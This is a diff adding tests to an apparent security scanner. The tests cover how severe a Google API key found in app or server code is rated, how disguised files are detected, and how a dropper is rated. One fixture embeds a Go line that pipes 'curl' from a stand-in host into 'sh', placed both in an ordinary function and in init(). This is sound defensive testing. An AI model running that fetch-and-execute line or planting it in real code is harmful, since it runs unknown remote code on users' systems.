@@ -14143,3 +14143,87 @@ class TestAZeroTimeoutMeansNoBudget:
         result = Scanner(config).scan(tmp_path)
         assert result.complete
         assert not any(f.rule_id == "OPERATIONAL.SCAN.TIMEOUT" for f in result.findings)
+
+
+class TestAGoogleKeyInClientAppSource:
+    KEY: ClassVar[str] = "AIza" + "SyDyT5W0Jh49F30Pqqtyfdf7pDLFKLJoAnw"
+
+    @staticmethod
+    def _severity(tmp_path, name: str, body: str):
+        from cordon_scanner import Scanner
+
+        target = tmp_path / name
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(body, encoding="utf-8")
+        return next(
+            (
+                f.severity
+                for f in Scanner().scan(tmp_path).findings
+                if f.rule_id == "SECRET.GOOGLE.API_KEY.001"
+            ),
+            None,
+        )
+
+    def test_an_android_app_key_is_below_the_gate(self, tmp_path) -> None:
+        body = f'object Keys {{ const val INNERTUBE = "{self.KEY}" }}\n'
+        assert self._severity(tmp_path, "app/src/main/kotlin/Keys.kt", body) is Severity.MEDIUM
+
+    def test_a_server_key_still_blocks(self, tmp_path) -> None:
+        body = f'GOOGLE_KEY = "{self.KEY}"\n'
+        assert self._severity(tmp_path, "server/settings.py", body) is Severity.HIGH
+
+
+class TestFilesNamedByTheirOwnFormat:
+    @staticmethod
+    def _rules(tmp_path, name: str, data: bytes) -> set[str]:
+        from cordon_scanner import Scanner
+
+        target = tmp_path / name
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(data)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_an_appledouble_file_is_not_a_disguise(self, tmp_path) -> None:
+        data = b"\x00\x05\x16\x07\x00\x02\x00\x00Mac OS X        " + bytes(64)
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in self._rules(
+            tmp_path, "__MACOSX/._logo.png", data
+        )
+
+    def test_a_script_named_like_one_still_is(self, tmp_path) -> None:
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" in self._rules(
+            tmp_path, "__MACOSX/._logo.png", b"#!/bin/sh\necho hi\n"
+        )
+
+    def test_compiled_terminfo_is_not_a_disguise(self, tmp_path) -> None:
+        data = b"\x1a\x01;\x00&\x00\x0f\x00\x9d\x01" + bytes(64)
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in self._rules(
+            tmp_path, "usr/share/terminfo/x/xterm.js", data
+        )
+
+
+class TestCompiledCodeRunsWhenTheProgramDoes:
+    BODY: ClassVar[str] = 'exec.Command("sh", "-c", "curl -s https://x.invalid/p | sh").Run()'
+
+    @staticmethod
+    def _severity(tmp_path, source: str):
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "update.go").write_text(source, encoding="utf-8")
+        found = [
+            f.severity
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if "DROPPER" in f.rule_id
+        ]
+        return max(found, default=None)
+
+    def test_a_function_the_program_calls_is_on_request(self, tmp_path) -> None:
+        source = f'package app\n\nimport "os/exec"\n\nfunc SelfUpdate() {{\n\t{self.BODY}\n}}\n'
+        assert self._severity(tmp_path, source) is Severity.MEDIUM
+
+    def test_init_runs_on_import_and_keeps_its_weight(self, tmp_path) -> None:
+        source = f'package app\n\nimport "os/exec"\n\nfunc init() {{\n\t{self.BODY}\n}}\n'
+        severity = self._severity(tmp_path, source)
+        assert severity is not None and severity >= Severity.HIGH
